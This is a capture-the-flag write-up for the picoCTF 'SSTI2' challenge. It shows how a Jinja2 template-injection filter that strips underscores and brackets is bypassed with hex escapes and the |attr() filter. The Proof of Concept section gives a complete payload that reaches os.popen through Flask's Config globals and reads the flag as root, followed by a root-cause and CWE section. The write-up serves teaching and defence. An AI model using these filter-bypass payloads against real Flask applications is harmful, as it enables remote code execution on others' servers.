# SSTI2

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{sst1_f1lt3r_byp4ss_6787c4d8}`

## Summary

A sequel to the basic SSTI1 challenge: the same Jinja2 template injection exists, but the app now
strips every literal underscore character from submitted input before rendering, defeating the
classic `self.__init__.__globals__...` payload directly. Underscores can be reconstructed at
Jinja2 evaluation time using `\x5f` hex escapes inside quoted string literals (the stripping only
touches literal `_` bytes, not escape sequences that later decode to one), combined with Jinja2's
`|attr()` filter for attribute access by string name instead of dot notation. A small number of
"dangerous" dunder attributes (`__base__`, `__mro__`, `__subclasses__`) are separately blocked
even when reconstructed this way, so the classic `object.__subclasses__()` walk doesn't work
here; the working path instead walks `__globals__` on Flask's own `Config` class, which imports
`os` directly, and pulls the `os` module out of that globals dict using a `{% for %}` loop over
`.items()` rather than subscript indexing (`[`/`]` characters are also stripped from input).

## Discovery

A basic `{{7*7}}` confirms Jinja2 SSTI still exists (renders `49`), but the SSTI1-style RCE
payload gets rejected with a custom message: `Stop trying to break me >:(`. Testing individual
tokens shows every underscore is silently deleted from the raw input before rendering:

```
content={{ '__class__' }}   ->  class
content={{ '__globals__' }} ->  globals
```

Since `\x5f` (hex escape for `_`) survives the strip (it contains no literal underscore byte) and
Jinja2 decodes hex escapes inside quoted strings at parse time, submitting
`{{ '\x5f\x5fclass\x5f\x5f' }}` renders the real string `__class__` intact. Combined with the
`|attr(name)` filter, which does attribute lookup by string argument instead of literal dot
syntax, this reaches arbitrary dunder attributes:

```
content={{ self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f') }}
```

returns the real `__globals__` dict of `self.__init__`. However, `__base__`, `__mro__`, and
`__subclasses__` all resolve to empty/Undefined even through this exact same mechanism, ruling
out the standard `''.__class__.__base__.__subclasses__()` universal-gadget approach used in
SSTI1-style challenges. `[` and `]` are also stripped from raw input (`x[0]` becomes `x0`), so
dictionary subscript syntax is unavailable too.

## Proof of Concept

Flask's built-in `config` object is reachable as a template global with no underscore in its own
name. Walking `config.__class__.__init__.__globals__` (Flask's `flask/config.py` module
namespace) via the hex-escape/`|attr()` technique reveals it imports `os` directly. A `{% for %}`
loop over that dict's `.items()` extracts the `os` module value without ever needing bracket
indexing:

```
content=
{% for k,v in config|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('items')() %}
  {% if k=='os' %}
    {{ v|attr('popen')('cat /challenge/flag')|attr('read')() }}
  {% endif %}
{% endfor %}
```

(sent as a single-line POST body). This confirms code execution as `root` and reads the flag
directly:

```
picoCTF{sst1_f1lt3r_byp4ss_6787c4d8}
```

## Root Cause

Blocklist-style input sanitization (stripping specific "dangerous" characters and attribute
names) is applied ahead of a fully expressive template engine. Since Jinja2 evaluates escape
sequences and resolves attributes dynamically at render time, any character or substring that
can be reconstructed programmatically after the filter runs defeats a filter that only inspects
the raw, pre-render input. Blocking specific known-dangerous attributes (`__subclasses__`, etc.)
without blocking the far larger set of equivalent techniques (`__globals__` walks on any
in-scope object) still leaves full RCE reachable.

## CWE / OWASP

- **CWE-1336**: Improper Neutralization of Special Elements Used in a Template Engine
- **CWE-693**: Protection Mechanism Failure (denylist filter bypassed via encoding/reconstruction)
- **OWASP A03:2021**: Injection
